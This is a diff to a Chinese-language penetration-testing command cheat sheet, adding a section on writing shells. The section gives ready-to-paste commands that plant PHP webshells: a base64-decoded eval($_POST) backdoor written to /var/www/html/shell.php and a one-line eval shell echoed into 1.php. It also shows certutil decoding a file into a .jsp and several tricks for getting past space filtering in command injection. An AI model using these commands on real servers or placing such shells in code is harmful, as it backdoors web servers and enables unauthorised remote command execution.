@@ -1,8 +1,10 @@
 # command
 收集渗透中会用到的常用命令  。
 
-更新时间：2022.2.27
+更新时间：2022.4.14
 
+
+以下目录有问题，待更新。建议直接[Ctrl+F]查找
 Table of Contents
 
 - [command](#command)
@@ -57,6 +59,50 @@ Table of Contents
     - [假冒令牌](#%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C)
     - [植入后门](#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8)
 - [cs大全](#cs%E5%A4%A7%E5%85%A8)
+
+## 写shell
+在windows中，批处理需要转义字符主要有 “&”，“|”，“<”，“>”等等，转义字符为”^”
+在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。
+
+
+方法1
+```
+set /p=qaxnb<nul>d:\1d13.txt
+```
+方法2
+```
+echo qaxnb>1we.txt
+```
+追加内容
+```
+echo qaxnb>>1we.txt
+```
+写特殊字符很多的文件，可以用certutil编码再还原。
+如下还原
+```
+certutil -f -decode 111.txt C:\\111.jsp
+certutil -decodehex 111.txt C:\\111.jsp
+```
+linux下base64
+```
+echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php
+```
+php的
+```
+echo \<\?php eval\(\@\$_POST\[1\]\)\; \?\> >1.php
+```
+绕过空格
+```
+> < <> 重定向符
+%09(需要php环境)
+${IFS}
+$IFS$9
+{cat,flag.php}
+%20
+%09
+```
+
+
 
 ## nmap
 
